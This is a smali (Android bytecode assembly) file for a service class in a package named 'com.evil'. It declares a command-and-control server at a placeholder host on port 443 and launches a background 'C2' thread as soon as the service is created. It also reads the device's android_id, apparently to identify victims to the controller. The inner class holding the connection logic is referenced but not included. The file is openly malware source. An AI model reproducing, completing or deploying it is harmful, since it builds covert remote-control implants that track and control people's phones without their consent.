.class public Lcom/evil/BackgroundService;
.super Landroid/app/Service;
.source "BackgroundService.java"

# static fields
.field private static final C2_SERVER:Ljava/lang/String; = "your-server.railway.app"
.field private static final C2_PORT:I = 0x1bb
.field private static final TAG:Ljava/lang/String; = "BackgroundService"

# instance fields
.field private deviceId:Ljava/lang/String;
.field private isRunning:Z
.field private thread:Ljava/lang/Thread;

# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0
    iput-boolean v0, p0, Lcom/evil/BackgroundService;->isRunning:Z

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .prologue
    const/4 v0, 0x0
    return-object v0
.end method

.method public onCreate()V
    .locals 2

    .prologue
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "BackgroundService"
    const-string v1, "Service Created"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-direct {p0}, Lcom/evil/BackgroundService;->startC2Connection()V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    const/4 v0, 0x0
    iput-boolean v0, p0, Lcom/evil/BackgroundService;->isRunning:Z

    const-string v0, "BackgroundService"
    const-string v1, "Service Destroyed"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method private startC2Connection()V
    .locals 2

    .prologue
    const/4 v0, 0x1
    iput-boolean v0, p0, Lcom/evil/BackgroundService;->isRunning:Z

    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/evil/BackgroundService$1;
    invoke-direct {v1, p0}, Lcom/evil/BackgroundService$1;-><init>(Lcom/evil/BackgroundService;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lcom/evil/BackgroundService;->thread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

# ========== Inner Class for C2 Thread ==========
.method public static synthetic access$000(Lcom/evil/BackgroundService;)Z
    .locals 1
    iget-boolean v0, p0, Lcom/evil/BackgroundService;->isRunning:Z
    return v0
.end method

.method public static synthetic access$100(Lcom/evil/BackgroundService;)Ljava/lang/String;
    .locals 1
    invoke-direct {p0}, Lcom/evil/BackgroundService;->getDeviceId()Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method

.method private getDeviceId()Ljava/lang/String;
    .locals 2
    invoke-virtual {p0}, Lcom/evil/BackgroundService;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0
    const-string v1, "android_id"
    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method